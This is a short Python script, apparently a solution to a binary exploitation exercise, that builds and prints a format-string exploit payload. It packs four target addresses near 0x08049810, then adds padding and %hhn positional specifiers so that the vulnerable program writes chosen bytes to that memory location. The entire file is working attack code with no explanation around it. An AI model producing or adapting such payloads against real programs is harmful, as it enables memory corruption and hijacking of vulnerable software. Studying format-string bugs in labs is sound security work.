padding_1 = "a" * 52
padding_2 = "a" * 17
padding_3 = "a" * 172
padding_4 = "a" * 1

# 0x08049810 x10... x98 x04 x08
adress_1 = "\x10\x98\x04\x08"
adress_2 = "\x11\x98\x04\x08"
adress_3 = "\x12\x98\x04\x08"
adress_4 = "\x13\x98\x04\x08"

payload =  adress_1 + adress_2 + adress_3 + adress_4 + padding_1 + "%12$hhn" + padding_2 + "%13$hhn" + padding_3 + "%15$hhn" + padding_4 + "%14$hhn"

import sys
sys.stdout.write(payload)